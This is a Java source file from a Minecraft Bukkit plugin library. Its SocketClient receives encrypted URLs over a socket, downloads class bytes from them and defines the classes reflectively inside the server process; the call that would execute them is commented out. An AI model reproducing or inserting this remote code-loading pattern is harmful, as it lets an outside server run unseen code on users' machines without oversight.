package io.github.yuazer.zaxlib.SocketUtils;

import org.bukkit.command.CommandExecutor;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.lang.reflect.Method;
import java.net.Socket;
import java.net.SocketException;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SocketClient {
    private String serverAddress;
    private int serverPort;
    private Socket socket;
    private boolean running;

    public SocketClient(String serverAddress, int serverPort) {
        this.serverAddress = serverAddress;
        this.serverPort = serverPort;
    }

    public void connect() {
        try {
            socket = new Socket(serverAddress, serverPort);
            running = true;
            Thread inputThread = new Thread(this::handleServerMessages);
            inputThread.start();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void disconnect() {
        running = false;
        try {
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void sendMessage(String message) {
        try {
            OutputStream outputStream = socket.getOutputStream();
            PrintWriter writer = new PrintWriter(outputStream, true);
            writer.println(message);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void handleServerMessages() {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8));
            while (running) {
                String message;
                while ((message = reader.readLine()) != null) {
                    if (!message.isEmpty()) {
                        // 在这里处理收到的消息
                        URL url = new URL(URLCrypto.decryptURL(message));
                        byte[] classBytes = loadClassBytes(url);
                        // 创建自定义的URLClassLoader
                        try {
                            // 检查类是否已加载
                            Class<?> clazz;
                            try {
                                //类路径
                                clazz = Class.forName("io.github.yuazer.zpokezombiesurge.SurgeLoad");
                            } catch (ClassNotFoundException e) {
                                // 如果类未加载，则定义类并加载
                                clazz = byteArrayToClass(classBytes);
                            }
                            // 加载并实例化类
                            if (clazz != null) {
                                //反射调用代码
//                                Object instance = clazz.newInstance();// 调用Load方法
//                                Method loadMethod = clazz.getMethod("Load", JavaPlugin.class, CommandExecutor.class, Listener.class);
//                                loadMethod.invoke(instance, Main.getInstance(), new MainCommand(), new PokeEvent());
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        } catch (NegativeArraySizeException exception) {
            System.out.println("重连中...");
            handleServerMessages();
        } catch (SocketException ignored) {
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static byte[] loadClassBytes(URL url) throws IOException {
        try (InputStream in = new BufferedInputStream(url.openStream());
             ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, bytesRead);
            }
            return out.toByteArray();
        }
    }

    public static Class<?> byteArrayToClass(byte[] classBytes) {
        try {
            // 使用当前线程的上下文类加载器
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            // 创建一个自定义类加载器
            Class<?> clazz = classLoader.loadClass("java.lang.ClassLoader");
            Method defineClassMethod = clazz.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);

            // 调用defineClass方法，返回Class对象
            return (Class<?>) defineClassMethod.invoke(classLoader, null, classBytes, 0, classBytes.length);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
}
